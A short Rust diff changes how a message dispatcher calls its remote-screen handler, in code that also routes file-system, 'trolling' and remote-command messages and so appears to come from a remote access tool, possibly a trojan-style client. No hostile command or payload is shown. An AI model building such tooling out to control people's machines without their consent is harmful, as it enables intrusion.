@@ -37,7 +37,7 @@ impl MessageType {
 pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut Socket, connection: &Connection) {
 	dbg!(&payload,&message);
 	match message {
-		MessageType::RemoteScreen => handle_remote_screen(payload, socket, connection).unwrap(), // Create new connection instead of passing existing websocket
+		MessageType::RemoteScreen => handle_remote_screen(payload, connection), // Create new connection instead of passing existing websocket
 		MessageType::FileSystem => handle_file_system(payload, socket),
 		MessageType::Trolling => handle_trolling(payload),
 		MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
